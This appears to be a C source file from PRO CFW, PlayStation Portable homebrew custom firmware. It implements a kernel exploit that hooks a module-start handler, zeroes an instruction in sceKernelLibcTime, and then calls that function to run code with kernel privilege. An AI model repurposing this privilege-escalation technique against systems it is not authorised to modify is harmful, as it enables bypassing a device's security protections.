/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>

#include "macros.h"
#include "globals.h"
#include "functions.h"
#include "kxploit.h"

#include "common/utils/scanner.c"

/*
Kernel exploit to use when ARK.BIN is already loaded within a Custom Firmware.
*/

UserFunctions* g_tbl = NULL;

void* (*set_start_module_handler)(void*) = NULL;
int (* _sceKernelLibcTime)(u32 a0, u32 a1) = (void*)NULL;
void (*prev)(void*) = NULL;

u32 patch_instr = 0;
u32 patch_addr = 0;

int stubScanner(UserFunctions* tbl){
    g_tbl = tbl;
    set_start_module_handler = tbl->FindImportUserRam("SystemCtrlForUser", 0x1C90BECB); // weak import in ARK Live
    _sceKernelLibcTime = (void*)(g_tbl->KernelLibcTime);
    return (set_start_module_handler == NULL || _sceKernelLibcTime == NULL);
}

void repairInstruction(KernelFunctions* k_tbl){
    if (patch_addr && patch_instr){
        // restore
        _sw(patch_instr, patch_addr);
    }
}

void my_mod_handler(void* mod){

    // corrupt kernel
    u32 libctime = (void*)FindFunction("sceSystemMemoryManager", "UtilsForUser", 0x27CC57F0);
    patch_addr = libctime + 4;
    patch_instr = _lw(patch_addr);
    _sw(0, patch_addr);

    // fallback to previous handler
    if (prev){
        prev(mod);
    }
    set_start_module_handler(prev);
}

int doExploit(void){
    prev = set_start_module_handler(my_mod_handler); // register our custom handler
    g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON); // trigger StartModule handler
    g_tbl->UtilityUnloadModule(PSP_MODULE_NP_COMMON);
    return (patch_addr == 0 || patch_instr == 0);
}

void executeKernel(u32 kfuncaddr){
    _sceKernelLibcTime(0x08800000, KERNELIFY(kfuncaddr));
}